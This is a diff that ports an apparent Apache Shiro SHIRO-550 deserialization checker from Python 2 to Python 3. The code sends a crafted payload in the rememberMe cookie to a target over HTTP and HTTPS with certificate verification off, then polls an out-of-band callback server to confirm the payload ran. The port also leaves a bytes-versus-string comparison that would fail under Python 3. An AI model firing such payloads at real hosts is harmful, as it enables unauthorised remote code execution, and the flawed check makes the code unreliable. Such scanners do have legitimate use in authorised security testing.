@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 #-*- coding: utf-8 -*-
-import urllib2
+import urllib.request, urllib.error, urllib.parse
 import ssl
 import socket
 import base64
@@ -47,19 +47,19 @@ def check(ip, port, timeout):
 	header = {'cookie': ("rememberMe=%s" % final_payload.decode())}
 
 	try:
-		request = urllib2.Request(('http://%s:%d' % (ip, port)), headers=header)
-		res_html = urllib2.urlopen(request, timeout=timeout).read()
+		request = urllib.request.Request(('http://%s:%d' % (ip, port)), headers=header)
+		res_html = urllib.request.urlopen(request, timeout=timeout).read()
 	except:pass
 	try:
 		ctx = ssl.create_default_context()
 		ctx.check_hostname = False
 		ctx.verify_mode = ssl.CERT_NONE
-		request = urllib2.Request(('https://%s:%d' % (ip, port)), headers=header)
-		res_html = urllib2.urlopen(request, context=ctx, timeout=timeout).read()
+		request = urllib.request.Request(('https://%s:%d' % (ip, port)), headers=header)
+		res_html = urllib.request.urlopen(request, context=ctx, timeout=timeout).read()
 	except:pass
 
 	time.sleep(5)
-	req = urllib2.Request("http://%s:8088/check/%s" % (dnsserver, random_num))
-	reqopen = urllib2.urlopen(req)
-	if 'YES' in reqopen.read():return u"存在SHIRO-550反序列化漏洞"
+	req = urllib.request.Request("http://%s:8088/check/%s" % (dnsserver, random_num))
+	reqopen = urllib.request.urlopen(req)
+	if 'YES' in reqopen.read():return "存在SHIRO-550反序列化漏洞"
 	return
